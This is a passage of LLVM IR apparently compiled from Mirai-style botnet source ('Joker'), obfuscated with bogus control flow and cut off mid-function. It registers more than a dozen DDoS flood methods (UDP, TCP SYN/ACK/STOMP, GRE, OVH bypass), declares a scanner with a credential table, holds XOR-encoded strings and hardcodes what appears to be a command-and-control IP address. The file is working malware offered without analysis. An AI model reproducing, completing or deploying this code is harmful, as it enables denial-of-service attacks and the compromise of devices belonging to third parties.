; ModuleID = 'host/ir_bcf/Joker.ll'
source_filename = "llvm-link"
target datalayout = "e-m:e-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.attack_method = type { void (i8, %struct.attack_target*, i8, %struct.attack_option*)*, i8 }
%struct.attack_target = type { %struct.sockaddr_in, i32, i8 }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.in_addr = type { i32 }
%struct.attack_option = type { i8*, i8 }
%struct.scanner_connection = type { %struct.scanner_auth*, i32, i32, i32, i32, i16, i32, [256 x i8], i8 }
%struct.scanner_auth = type { i8*, i8*, i16, i16, i8, i8 }
%struct.table_value = type { i8*, i16 }
%struct.iphdr = type { i8, i8, i16, i16, i16, i8, i8, i16, i32, i32 }
%struct.grehdr = type { i16, i16 }
%struct.udphdr = type { i16, i16, i16, i16 }
%union.__CONST_SOCKADDR_ARG = type { %struct.sockaddr* }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.ethhdr = type { [6 x i8], [6 x i8], i16 }
%struct.tcphdr = type { i16, i16, i32, i32, i16, i16, i16, i16 }
%struct.attack_stomp_data = type { i32, i32, i32, i16, i16 }
%struct.dnshdr = type { i16, i16, i16, i16, i16, i16 }
%struct.fd_set.28 = type { [16 x i64] }
%struct.timeval.29 = type { i64, i64 }

@methods_len = global i8 0, align 1
@methods = global %struct.attack_method** null, align 8
@attack_ongoing = global [15 x i32] zeroinitializer, align 16
@LOCAL_ADDR = common global i32 0, align 4
@x = internal global i32 0, align 4
@y = internal global i32 0, align 4
@z = internal global i32 0, align 4
@w = internal global i32 0, align 4
@scanner_pid = common global i32 0, align 4
@fake_time = global i32 0, align 4
@conn_table = common global %struct.scanner_connection* null, align 8
@rsck = common global i32 0, align 4
@scanner_rawpkt = global [40 x i8] zeroinitializer, align 16
@.str = private unnamed_addr constant [5 x i8] c"&;; \00", align 1
@.str.1 = private unnamed_addr constant [1 x i8] zeroinitializer, align 1
@.str.2 = private unnamed_addr constant [9 x i8] c"<!: acam\00", align 1
@.str.3 = private unnamed_addr constant [7 x i8] c" 18:1 \00", align 1
@.str.4 = private unnamed_addr constant [8 x i8] c"0125!8 \00", align 1
@.str.5 = private unnamed_addr constant [9 x i8] c"$5''#;&0\00", align 1
@.str.6 = private unnamed_addr constant [6 x i8] c"509=:\00", align 1
@.str.7 = private unnamed_addr constant [6 x i8] c"\22=.,\22\00", align 1
@.str.8 = private unnamed_addr constant [8 x i8] c"'!$$;& \00", align 1
@.str.9 = private unnamed_addr constant [13 x i8] c"c!>\19?;d509=:\00", align 1
@.str.10 = private unnamed_addr constant [6 x i8] c"efg`a\00", align 1
@.str.11 = private unnamed_addr constant [5 x i8] c"!'1&\00", align 1
@.str.12 = private unnamed_addr constant [9 x i8] c"\1B,<8#\07\13l\00", align 1
@.str.13 = private unnamed_addr constant [9 x i8] c"\07f2\13%\1A\12'\00", align 1
@.str.14 = private unnamed_addr constant [3 x i8] c"\0D\0A\00", align 1
@.str.15 = private unnamed_addr constant [16 x i8] c"173.232.146.173\00", align 1
@consume_iacs.tmp1 = private unnamed_addr constant [3 x i8] c"\FF\FB\1F", align 1
@consume_iacs.tmp2 = private unnamed_addr constant [9 x i8] c"\FF\FA\1F\00P\00\18\FF\F0", align 1
@auth_table_max_weight = global i16 0, align 2
@auth_table_len = global i32 0, align 4
@auth_table = global %struct.scanner_auth* null, align 8
@table = common global [31 x %struct.table_value] zeroinitializer, align 16
@table_key = global i32 -555811921, align 4
@x.1 = common global i32 0
@y.2 = common global i32 0
@x.3 = common global i32 0
@y.4 = common global i32 0
@x.5 = common global i32 0
@y.6 = common global i32 0
@x.7 = common global i32 0
@y.8 = common global i32 0
@x.9 = common global i32 0
@y.10 = common global i32 0
@x.11 = common global i32 0
@y.12 = common global i32 0
@x.13 = common global i32 0
@y.14 = common global i32 0
@x.15 = common global i32 0
@y.16 = common global i32 0
@x.17 = common global i32 0
@y.18 = common global i32 0
@x.19 = common global i32 0
@y.20 = common global i32 0
@x.21 = common global i32 0
@y.22 = common global i32 0
@x.23 = common global i32 0
@y.24 = common global i32 0
@x.25 = common global i32 0
@y.26 = common global i32 0
@x.27 = common global i32 0
@y.28 = common global i32 0
@x.29 = common global i32 0
@y.30 = common global i32 0
@x.31 = common global i32 0
@y.32 = common global i32 0
@x.33 = common global i32 0
@y.34 = common global i32 0
@x.35 = common global i32 0
@y.36 = common global i32 0
@x.37 = common global i32 0
@y.38 = common global i32 0
@x.39 = common global i32 0
@y.40 = common global i32 0
@x.41 = common global i32 0
@y.42 = common global i32 0
@x.43 = common global i32 0
@y.44 = common global i32 0
@x.45 = common global i32 0
@y.46 = common global i32 0
@x.47 = common global i32 0
@y.48 = common global i32 0
@x.49 = common global i32 0
@y.50 = common global i32 0
@x.51 = common global i32 0
@y.52 = common global i32 0
@x.53 = common global i32 0
@y.54 = common global i32 0
@x.55 = common global i32 0
@y.56 = common global i32 0
@x.57 = common global i32 0
@y.58 = common global i32 0
@x.59 = common global i32 0
@y.60 = common global i32 0
@x.61 = common global i32 0
@y.62 = common global i32 0
@x.63 = common global i32 0
@y.64 = common global i32 0
@x.65 = common global i32 0
@y.66 = common global i32 0
@x.67 = common global i32 0
@y.68 = common global i32 0
@x.69 = common global i32 0
@y.70 = common global i32 0
@x.71 = common global i32 0
@y.72 = common global i32 0
@x.73 = common global i32 0
@y.74 = common global i32 0
@x.75 = common global i32 0
@y.76 = common global i32 0
@x.77 = common global i32 0
@y.78 = common global i32 0
@x.79 = common global i32 0
@y.80 = common global i32 0
@x.81 = common global i32 0
@y.82 = common global i32 0
@x.83 = common global i32 0
@y.84 = common global i32 0
@x.85 = common global i32 0
@y.86 = common global i32 0
@x.87 = common global i32 0
@y.88 = common global i32 0
@x.89 = common global i32 0
@y.90 = common global i32 0
@x.91 = common global i32 0
@y.92 = common global i32 0
@x.93 = common global i32 0
@y.94 = common global i32 0
@x.95 = common global i32 0
@y.96 = common global i32 0
@x.97 = common global i32 0
@y.98 = common global i32 0
@x.99 = common global i32 0
@y.100 = common global i32 0

; Function Attrs: noinline nounwind uwtable
define signext i8 @attack_init() #0 {
  %1 = load i32, i32* @x.1
  %2 = load i32, i32* @y.2
  %3 = sub i32 %1, 1
  %4 = mul i32 %1, %3
  %5 = urem i32 %4, 2
  %6 = icmp eq i32 %5, 0
  %7 = icmp slt i32 %2, 10
  %8 = or i1 %6, %7
  br i1 %8, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %0
  %9 = alloca i32, align 4
  call void @add_attack(i8 zeroext 0, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_udpgeneric)
  call void @add_attack(i8 zeroext 1, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_udpvse)
  call void @add_attack(i8 zeroext 2, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_udpdns)
  call void @add_attack(i8 zeroext 8, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_udpplain)
  call void @add_attack(i8 zeroext 3, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_tcpsyn)
  call void @add_attack(i8 zeroext 4, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_tcpack)
  call void @add_attack(i8 zeroext 5, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_tcpstomp)
  call void @add_attack(i8 zeroext 10, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_tcpxmas)
  call void @add_attack(i8 zeroext 6, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_greip)
  call void @add_attack(i8 zeroext 7, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_greeth)
  call void @add_attack(i8 zeroext 9, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_std)
  call void @add_attack(i8 zeroext 14, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_ovh)
  call void @add_attack(i8 zeroext 11, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_tcpusyn)
  call void @add_attack(i8 zeroext 12, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_tcpall)
  call void @add_attack(i8 zeroext 13, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_tcpfrag)
  call void @add_attack(i8 zeroext 15, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_asyn)
  %10 = load i32, i32* @x.1
  %11 = load i32, i32* @y.2
  %12 = sub i32 %10, 1
  %13 = mul i32 %10, %12
  %14 = urem i32 %13, 2
  %15 = icmp eq i32 %14, 0
  %16 = icmp slt i32 %11, 10
  %17 = or i1 %15, %16
  br i1 %17, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  ret i8 1

originalBBalteredBB:                              ; preds = %originalBB, %0
  %18 = alloca i32, align 4
  call void @add_attack(i8 zeroext 0, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_udpgeneric)
  call void @add_attack(i8 zeroext 1, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_udpvse)
  call void @add_attack(i8 zeroext 2, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_udpdns)
  call void @add_attack(i8 zeroext 8, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_udpplain)
  call void @add_attack(i8 zeroext 3, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_tcpsyn)
  call void @add_attack(i8 zeroext 4, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_tcpack)
  call void @add_attack(i8 zeroext 5, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_tcpstomp)
  call void @add_attack(i8 zeroext 10, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_tcpxmas)
  call void @add_attack(i8 zeroext 6, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_greip)
  call void @add_attack(i8 zeroext 7, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_greeth)
  call void @add_attack(i8 zeroext 9, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_std)
  call void @add_attack(i8 zeroext 14, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_ovh)
  call void @add_attack(i8 zeroext 11, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_tcpusyn)
  call void @add_attack(i8 zeroext 12, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_tcpall)
  call void @add_attack(i8 zeroext 13, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_tcpfrag)
  call void @add_attack(i8 zeroext 15, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_asyn)
  br label %originalBB
}

; Function Attrs: noinline nounwind uwtable
define internal void @add_attack(i8 zeroext, void (i8, %struct.attack_target*, i8, %struct.attack_option*)*) #0 {
  %3 = alloca i8, align 1
  %4 = alloca void (i8, %struct.attack_target*, i8, %struct.attack_option*)*, align 8
  %5 = alloca %struct.attack_method*, align 8
  store i8 %0, i8* %3, align 1
  store void (i8, %struct.attack_target*, i8, %struct.attack_option*)* %1, void (i8, %struct.attack_target*, i8, %struct.attack_option*)** %4, align 8
  %6 = call noalias i8* @calloc(i64 1, i64 16) #6
  %7 = bitcast i8* %6 to %struct.attack_method*
  store %struct.attack_method* %7, %struct.attack_method** %5, align 8
  %8 = load i8, i8* %3, align 1
  %9 = load %struct.attack_method*, %struct.attack_method** %5, align 8
  %10 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %9, i32 0, i32 1
  store i8 %8, i8* %10, align 8
  %11 = load void (i8, %struct.attack_target*, i8, %struct.attack_option*)*, void (i8, %struct.attack_target*, i8, %struct.attack_option*)** %4, align 8
  %12 = load %struct.attack_method*, %struct.attack_method** %5, align 8
  %13 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %12, i32 0, i32 0
  store void (i8, %struct.attack_target*, i8, %struct.attack_option*)* %11, void (i8, %struct.attack_target*, i8, %struct.attack_option*)** %13, align 8
  %14 = load %struct.attack_method**, %struct.attack_method*** @methods, align 8
  %15 = bitcast %struct.attack_method** %14 to i8*
  %16 = load i8, i8* @methods_len, align 1
  %17 = zext i8 %16 to i32
  %18 = add nsw i32 %17, 1
  %19 = sext i32 %18 to i64
  %20 = mul i64 %19, 8
  %21 = call i8* @realloc(i8* %15, i64 %20) #6
  %22 = bitcast i8* %21 to %struct.attack_method**
  store %struct.attack_method** %22, %struct.attack_method*** @methods, align 8
  %23 = load %struct.attack_method*, %struct.attack_method** %5, align 8
  %24 = load %struct.attack_method**, %struct.attack_method*** @methods, align 8
  %25 = load i8, i8* @methods_len, align 1
  %26 = add i8 %25, 1
  store i8 %26, i8* @methods_len, align 1
  %27 = zext i8 %25 to i64
  %28 = getelementptr inbounds %struct.attack_method*, %struct.attack_method** %24, i64 %27
  store %struct.attack_method* %23, %struct.attack_method** %28, align 8
  ret void
}

; Function Attrs: nounwind
declare noalias i8* @calloc(i64, i64) #1

; Function Attrs: nounwind
declare i8* @realloc(i8*, i64) #1

; Function Attrs: noinline nounwind uwtable
define void @attack_kill_all() #0 {
  %1 = alloca i32, align 4
  store i32 0, i32* %1, align 4
  br label %2

; <label>:2:                                      ; preds = %21, %0
  %3 = load i32, i32* %1, align 4
  %4 = icmp slt i32 %3, 15
  br i1 %4, label %5, label %24

; <label>:5:                                      ; preds = %2
  %6 = load i32, i32* %1, align 4
  %7 = sext i32 %6 to i64
  %8 = getelementptr inbounds [15 x i32], [15 x i32]* @attack_ongoing, i64 0, i64 %7
  %9 = load i32, i32* %8, align 4
  %10 = icmp ne i32 %9, 0
  br i1 %10, label %11, label %17

; <label>:11:                                     ; preds = %5
  %12 = load i32, i32* %1, align 4
  %13 = sext i32 %12 to i64
  %14 = getelementptr inbounds [15 x i32], [15 x i32]* @attack_ongoing, i64 0, i64 %13
  %15 = load i32, i32* %14, align 4
  %16 = call i32 @kill(i32 %15, i32 9) #6
  br label %17

; <label>:17:                                     ; preds = %11, %5
  %18 = load i32, i32* %1, align 4
  %19 = sext i32 %18 to i64
  %20 = getelementptr inbounds [15 x i32], [15 x i32]* @attack_ongoing, i64 0, i64 %19
  store i32 0, i32* %20, align 4
  br label %21

; <label>:21:                                     ; preds = %17
  %22 = load i32, i32* %1, align 4
  %23 = add nsw i32 %22, 1
  store i32 %23, i32* %1, align 4
  br label %2

; <label>:24:                                     ; preds = %2
  %25 = load i32, i32* @x.5
  %26 = load i32, i32* @y.6
  %27 = sub i32 %25, 1
  %28 = mul i32 %25, %27
  %29 = urem i32 %28, 2
  %30 = icmp eq i32 %29, 0
  %31 = icmp slt i32 %26, 10
  %32 = or i1 %30, %31
  br i1 %32, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %24
  call void (...) bitcast (void ()* @scanner_init to void (...)*)()
  %33 = load i32, i32* @x.5
  %34 = load i32, i32* @y.6
  %35 = sub i32 %33, 1
  %36 = mul i32 %33, %35
  %37 = urem i32 %36, 2
  %38 = icmp eq i32 %37, 0
  %39 = icmp slt i32 %34, 10
  %40 = or i1 %38, %39
  br i1 %40, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %24
  call void (...) bitcast (void ()* @scanner_init to void (...)*)()
  br label %originalBB
}

; Function Attrs: nounwind
declare i32 @kill(i32, i32) #1

; Function Attrs: noinline nounwind uwtable
define void @attack_parse(i8*, i32) #0 {
  %3 = load i32, i32* @x.7
  %4 = load i32, i32* @y.8
  %5 = sub i32 %3, 1
  %6 = mul i32 %3, %5
  %7 = urem i32 %6, 2
  %8 = icmp eq i32 %7, 0
  %9 = icmp slt i32 %4, 10
  %10 = or i1 %8, %9
  br i1 %10, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %2
  %11 = alloca i8*, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i8, align 1
  %16 = alloca i8, align 1
  %17 = alloca i8, align 1
  %18 = alloca %struct.attack_target*, align 8
  %19 = alloca %struct.attack_option*, align 8
  %20 = alloca i8, align 1
  store i8* %0, i8** %11, align 8
  store i32 %1, i32* %12, align 4
  store %struct.attack_target* null, %struct.attack_target** %18, align 8
  store %struct.attack_option* null, %struct.attack_option** %19, align 8
  %21 = load i32, i32* %12, align 4
  %22 = sext i32 %21 to i64
  %23 = icmp ult i64 %22, 4
  %24 = load i32, i32* @x.7
  %25 = load i32, i32* @y.8
  %26 = sub i32 %24, 1
  %27 = mul i32 %24, %26
  %28 = urem i32 %27, 2
  %29 = icmp eq i32 %28, 0
  %30 = icmp slt i32 %25, 10
  %31 = or i1 %29, %30
  br i1 %31, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %23, label %32, label %49

; <label>:32:                                     ; preds = %originalBBpart2
  %33 = load i32, i32* @x.7
  %34 = load i32, i32* @y.8
  %35 = sub i32 %33, 1
  %36 = mul i32 %33, %35
  %37 = urem i32 %36, 2
  %38 = icmp eq i32 %37, 0
  %39 = icmp slt i32 %34, 10
  %40 = or i1 %38, %39
  br i1 %40, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %32
  %41 = load i32, i32* @x.7
  %42 = load i32, i32* @y.8
  %43 = sub i32 %41, 1
  %44 = mul i32 %41, %43
  %45 = urem i32 %44, 2
  %46 = icmp eq i32 %45, 0
  %47 = icmp slt i32 %42, 10
  %48 = or i1 %46, %47
  br i1 %48, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %427

; <label>:49:                                     ; preds = %originalBBpart2
  %50 = load i32, i32* @x.7
  %51 = load i32, i32* @y.8
  %52 = sub i32 %50, 1
  %53 = mul i32 %50, %52
  %54 = urem i32 %53, 2
  %55 = icmp eq i32 %54, 0
  %56 = icmp slt i32 %51, 10
  %57 = or i1 %55, %56
  br i1 %57, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %49
  %58 = load i8*, i8** %11, align 8
  %59 = bitcast i8* %58 to i32*
  %60 = load i32, i32* %59, align 4
  %61 = call i32 @ntohl(i32 %60) #7
  store i32 %61, i32* %14, align 4
  %62 = load i8*, i8** %11, align 8
  %63 = getelementptr inbounds i8, i8* %62, i64 4
  store i8* %63, i8** %11, align 8
  %64 = load i32, i32* %12, align 4
  %65 = sext i32 %64 to i64
  %66 = sub i64 %65, 4
  %67 = trunc i64 %66 to i32
  store i32 %67, i32* %12, align 4
  %68 = load i32, i32* %12, align 4
  %69 = icmp eq i32 %68, 0
  %70 = load i32, i32* @x.7
  %71 = load i32, i32* @y.8
  %72 = sub i32 %70, 1
  %73 = mul i32 %70, %72
  %74 = urem i32 %73, 2
  %75 = icmp eq i32 %74, 0
  %76 = icmp slt i32 %71, 10
  %77 = or i1 %75, %76
  br i1 %77, label %originalBBpart219, label %originalBB6alteredBB

originalBBpart219:                                ; preds = %originalBB6
  br i1 %69, label %78, label %79

; <label>:78:                                     ; preds = %originalBBpart219
  br label %427

; <label>:79:                                     ; preds = %originalBBpart219
  %80 = load i32, i32* @x.7
  %81 = load i32, i32* @y.8
  %82 = sub i32 %80, 1
  %83 = mul i32 %80, %82
  %84 = urem i32 %83, 2
  %85 = icmp eq i32 %84, 0
  %86 = icmp slt i32 %81, 10
  %87 = or i1 %85, %86
  br i1 %87, label %originalBB21, label %originalBB21alteredBB

originalBB21:                                     ; preds = %originalBB21alteredBB, %79
  %88 = load i8*, i8** %11, align 8
  %89 = getelementptr inbounds i8, i8* %88, i32 1
  store i8* %89, i8** %11, align 8
  %90 = load i8, i8* %88, align 1
  store i8 %90, i8* %15, align 1
  %91 = load i32, i32* %12, align 4
  %92 = sext i32 %91 to i64
  %93 = sub i64 %92, 1
  %94 = trunc i64 %93 to i32
  store i32 %94, i32* %12, align 4
  %95 = load i32, i32* %12, align 4
  %96 = icmp eq i32 %95, 0
  %97 = load i32, i32* @x.7
  %98 = load i32, i32* @y.8
  %99 = sub i32 %97, 1
  %100 = mul i32 %97, %99
  %101 = urem i32 %100, 2
  %102 = icmp eq i32 %101, 0
  %103 = icmp slt i32 %98, 10
  %104 = or i1 %102, %103
  br i1 %104, label %originalBBpart237, label %originalBB21alteredBB

originalBBpart237:                                ; preds = %originalBB21
  br i1 %96, label %105, label %106

; <label>:105:                                    ; preds = %originalBBpart237
  br label %427

; <label>:106:                                    ; preds = %originalBBpart237
  %107 = load i8*, i8** %11, align 8
  %108 = getelementptr inbounds i8, i8* %107, i32 1
  store i8* %108, i8** %11, align 8
  %109 = load i8, i8* %107, align 1
  store i8 %109, i8* %16, align 1
  %110 = load i32, i32* %12, align 4
  %111 = sext i32 %110 to i64
  %112 = sub i64 %111, 1
  %113 = trunc i64 %112 to i32
  store i32 %113, i32* %12, align 4
  %114 = load i8, i8* %16, align 1
  %115 = zext i8 %114 to i32
  %116 = icmp eq i32 %115, 0
  br i1 %116, label %117, label %118

; <label>:117:                                    ; preds = %106
  br label %427

; <label>:118:                                    ; preds = %106
  %119 = load i32, i32* @x.7
  %120 = load i32, i32* @y.8
  %121 = sub i32 %119, 1
  %122 = mul i32 %119, %121
  %123 = urem i32 %122, 2
  %124 = icmp eq i32 %123, 0
  %125 = icmp slt i32 %120, 10
  %126 = or i1 %124, %125
  br i1 %126, label %originalBB39, label %originalBB39alteredBB

originalBB39:                                     ; preds = %originalBB39alteredBB, %118
  %127 = load i32, i32* %12, align 4
  %128 = sext i32 %127 to i64
  %129 = load i8, i8* %16, align 1
  %130 = zext i8 %129 to i64
  %131 = mul i64 5, %130
  %132 = icmp ult i64 %128, %131
  %133 = load i32, i32* @x.7
  %134 = load i32, i32* @y.8
  %135 = sub i32 %133, 1
  %136 = mul i32 %133, %135
  %137 = urem i32 %136, 2
  %138 = icmp eq i32 %137, 0
  %139 = icmp slt i32 %134, 10
  %140 = or i1 %138, %139
  br i1 %140, label %originalBBpart253, label %originalBB39alteredBB

originalBBpart253:                                ; preds = %originalBB39
  br i1 %132, label %141, label %142

; <label>:141:                                    ; preds = %originalBBpart253
  br label %427

; <label>:142:                                    ; preds = %originalBBpart253
  %143 = load i32, i32* @x.7
  %144 = load i32, i32* @y.8
  %145 = sub i32 %143, 1
  %146 = mul i32 %143, %145
  %147 = urem i32 %146, 2
  %148 = icmp eq i32 %147, 0
  %149 = icmp slt i32 %144, 10
  %150 = or i1 %148, %149
  br i1 %150, label %originalBB55, label %originalBB55alteredBB

originalBB55:                                     ; preds = %originalBB55alteredBB, %142
  %151 = load i8, i8* %16, align 1
  %152 = zext i8 %151 to i64
  %153 = call noalias i8* @calloc(i64 %152, i64 24) #6
  %154 = bitcast i8* %153 to %struct.attack_target*
  store %struct.attack_target* %154, %struct.attack_target** %18, align 8
  store i32 0, i32* %13, align 4
  %155 = load i32, i32* @x.7
  %156 = load i32, i32* @y.8
  %157 = sub i32 %155, 1
  %158 = mul i32 %155, %157
  %159 = urem i32 %158, 2
  %160 = icmp eq i32 %159, 0
  %161 = icmp slt i32 %156, 10
  %162 = or i1 %160, %161
  br i1 %162, label %originalBBpart257, label %originalBB55alteredBB

originalBBpart257:                                ; preds = %originalBB55
  br label %163

; <label>:163:                                    ; preds = %originalBBpart270, %originalBBpart257
  %164 = load i32, i32* %13, align 4
  %165 = load i8, i8* %16, align 1
  %166 = zext i8 %165 to i32
  %167 = icmp slt i32 %164, %166
  br i1 %167, label %168, label %229

; <label>:168:                                    ; preds = %163
  %169 = load i8*, i8** %11, align 8
  %170 = bitcast i8* %169 to i32*
  %171 = load i32, i32* %170, align 4
  %172 = load %struct.attack_target*, %struct.attack_target** %18, align 8
  %173 = load i32, i32* %13, align 4
  %174 = sext i32 %173 to i64
  %175 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %172, i64 %174
  %176 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %175, i32 0, i32 1
  store i32 %171, i32* %176, align 4
  %177 = load i8*, i8** %11, align 8
  %178 = getelementptr inbounds i8, i8* %177, i64 4
  store i8* %178, i8** %11, align 8
  %179 = load i8*, i8** %11, align 8
  %180 = getelementptr inbounds i8, i8* %179, i32 1
  store i8* %180, i8** %11, align 8
  %181 = load i8, i8* %179, align 1
  %182 = load %struct.attack_target*, %struct.attack_target** %18, align 8
  %183 = load i32, i32* %13, align 4
  %184 = sext i32 %183 to i64
  %185 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %182, i64 %184
  %186 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %185, i32 0, i32 2
  store i8 %181, i8* %186, align 4
  %187 = load i32, i32* %12, align 4
  %188 = sext i32 %187 to i64
  %189 = sub i64 %188, 5
  %190 = trunc i64 %189 to i32
  store i32 %190, i32* %12, align 4
  %191 = load %struct.attack_target*, %struct.attack_target** %18, align 8
  %192 = load i32, i32* %13, align 4
  %193 = sext i32 %192 to i64
  %194 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %191, i64 %193
  %195 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %194, i32 0, i32 0
  %196 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %195, i32 0, i32 0
  store i16 2, i16* %196, align 4
  %197 = load %struct.attack_target*, %struct.attack_target** %18, align 8
  %198 = load i32, i32* %13, align 4
  %199 = sext i32 %198 to i64
  %200 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %197, i64 %199
  %201 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %200, i32 0, i32 1
  %202 = load i32, i32* %201, align 4
  %203 = load %struct.attack_target*, %struct.attack_target** %18, align 8
  %204 = load i32, i32* %13, align 4
  %205 = sext i32 %204 to i64
  %206 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %203, i64 %205
  %207 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %206, i32 0, i32 0
  %208 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %207, i32 0, i32 2
  %209 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %208, i32 0, i32 0
  store i32 %202, i32* %209, align 4
  br label %210

; <label>:210:                                    ; preds = %168
  %211 = load i32, i32* @x.7
  %212 = load i32, i32* @y.8
  %213 = sub i32 %211, 1
  %214 = mul i32 %211, %213
  %215 = urem i32 %214, 2
  %216 = icmp eq i32 %215, 0
  %217 = icmp slt i32 %212, 10
  %218 = or i1 %216, %217
  br i1 %218, label %originalBB59, label %originalBB59alteredBB

originalBB59:                                     ; preds = %originalBB59alteredBB, %210
  %219 = load i32, i32* %13, align 4
  %220 = add nsw i32 %219, 1
  store i32 %220, i32* %13, align 4
  %221 = load i32, i32* @x.7
  %222 = load i32, i32* @y.8
  %223 = sub i32 %221, 1
  %224 = mul i32 %221, %223
  %225 = urem i32 %224, 2
  %226 = icmp eq i32 %225, 0
  %227 = icmp slt i32 %222, 10
  %228 = or i1 %226, %227
  br i1 %228, label %originalBBpart270, label %originalBB59alteredBB

originalBBpart270:                                ; preds = %originalBB59
  br label %163

; <label>:229:                                    ; preds = %163
  %230 = load i32, i32* %12, align 4
  %231 = sext i32 %230 to i64
  %232 = icmp ult i64 %231, 1
  br i1 %232, label %233, label %250

; <label>:233:                                    ; preds = %229
  %234 = load i32, i32* @x.7
  %235 = load i32, i32* @y.8
  %236 = sub i32 %234, 1
  %237 = mul i32 %234, %236
  %238 = urem i32 %237, 2
  %239 = icmp eq i32 %238, 0
  %240 = icmp slt i32 %235, 10
  %241 = or i1 %239, %240
  br i1 %241, label %originalBB72, label %originalBB72alteredBB

originalBB72:                                     ; preds = %originalBB72alteredBB, %233
  %242 = load i32, i32* @x.7
  %243 = load i32, i32* @y.8
  %244 = sub i32 %242, 1
  %245 = mul i32 %242, %244
  %246 = urem i32 %245, 2
  %247 = icmp eq i32 %246, 0
  %248 = icmp slt i32 %243, 10
  %249 = or i1 %247, %248
  br i1 %249, label %originalBBpart274, label %originalBB72alteredBB

originalBBpart274:                                ; preds = %originalBB72
  br label %427

; <label>:250:                                    ; preds = %229
  %251 = load i32, i32* @x.7
  %252 = load i32, i32* @y.8
  %253 = sub i32 %251, 1
  %254 = mul i32 %251, %253
  %255 = urem i32 %254, 2
  %256 = icmp eq i32 %255, 0
  %257 = icmp slt i32 %252, 10
  %258 = or i1 %256, %257
  br i1 %258, label %originalBB76, label %originalBB76alteredBB

originalBB76:                                     ; preds = %originalBB76alteredBB, %250
  %259 = load i8*, i8** %11, align 8
  %260 = getelementptr inbounds i8, i8* %259, i32 1
  store i8* %260, i8** %11, align 8
  %261 = load i8, i8* %259, align 1
  store i8 %261, i8* %17, align 1
  %262 = load i32, i32* %12, align 4
  %263 = sext i32 %262 to i64
  %264 = sub i64 %263, 1
  %265 = trunc i64 %264 to i32
  store i32 %265, i32* %12, align 4
  %266 = load i8, i8* %17, align 1
  %267 = zext i8 %266 to i32
  %268 = icmp sgt i32 %267, 0
  %269 = load i32, i32* @x.7
  %270 = load i32, i32* @y.8
  %271 = sub i32 %269, 1
  %272 = mul i32 %269, %271
  %273 = urem i32 %272, 2
  %274 = icmp eq i32 %273, 0
  %275 = icmp slt i32 %270, 10
  %276 = or i1 %274, %275
  br i1 %276, label %originalBBpart291, label %originalBB76alteredBB

originalBBpart291:                                ; preds = %originalBB76
  br i1 %268, label %277, label %419

; <label>:277:                                    ; preds = %originalBBpart291
  %278 = load i8, i8* %17, align 1
  %279 = zext i8 %278 to i64
